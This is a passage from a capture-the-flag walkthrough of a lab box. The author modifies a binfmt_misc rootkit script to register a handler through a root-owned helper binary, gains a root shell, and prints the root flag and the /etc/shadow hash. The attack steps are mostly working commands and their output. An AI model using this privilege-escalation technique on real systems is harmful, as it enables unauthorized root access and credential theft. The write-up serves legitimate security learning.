We see the problem is only root has write access to the register file. Going back to that reg_helper binary, we saw it writes to the register file for us. We just need to alter the exploit slightly:

```sh
dev@retired:~$ cp binfmt_rootkit binfmt_rootkit_pencer
dev@retired:~$ nano binfmt_rootkit_pencer 
```

First we can comment out the check to see if the register file is writeable:

```text
EOF
    exit 1
}

#function not_writeable()
#{
#       test ! -w "$mountpoint/register"
#}
```

Also comment out the line that calls the function we've just commented out:

```text
[[ -n "$1" ]] && usage

#not_writeable && die "Error: $mountpoint/register is not writeable"

target="$(pick_suid "$searchsuid")"
test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"
```

Now change the last section so instead of trying to write to the register file it calls the reg helper binary instead:

```text
chmod a+x "$fmtinterpr"

binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /home/dev/emuemu/reg_helper

exec "$target"
```

Now when we run it we find it's still not quite right:

```text
dev@retired:~$ ./binfmt_rootkit_pencer
./binfmt_rootkit_pencer: line 101: /home/dev/emuemu/reg_helper: Permission denied
umount: bad usage
Try 'umount --help' for more information.
```

Of course that reg_helper file was owned by dev, a quick look finds another version of it hidden elsewhere:

```sh
dev@retired:~$ find / -name reg_helper 2>0
/usr/lib/emuemu/reg_helper
/home/dev/emuemu/reg_helper

dev@retired:~$ ls -lsa /usr/lib/emuemu/reg_helper
20 -rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
```

That's better, now just change the line in our exploit script to point to that one instead:

```text
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper
```

Finally we can run the exploit and get a root shell:

```text
dev@retired:~$ ./binfmt_rootkit_pencer 
uid=0(root) euid=0(root)

# cat /root/root.txt
e625876b20e8072dc89a6f64e6083a00

# cat /etc/shadow | grep root
root:$y$j9T$WTPWClbhbDs7l.UxQ36u80$ARJoOe6zhfOEca5WFBXjo4fGaxCg1Iof6qTbrfn1CzA:19062:0:99999:7:::
```

All done. I thought that was a pretty difficult box to say it was supposed to be medium, but I did learn some things along the way so definietly worth it. See you next time.
